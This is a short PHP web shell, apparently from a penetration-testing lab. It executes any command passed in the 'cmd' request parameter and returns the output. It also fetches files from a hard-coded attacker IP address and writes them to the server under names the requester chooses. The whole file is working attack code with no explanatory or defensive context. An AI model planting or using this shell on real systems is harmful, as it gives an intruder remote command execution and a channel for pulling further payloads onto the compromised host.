<?php
  $url = "10.10.14.175";
  
  if (isset($_REQUEST['upload'])) {
    file_put_contents($_REQUEST['upload'], file_get_contents($url . '/' . $_REQUEST['upload']));
  };
  if (isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
  };
?>
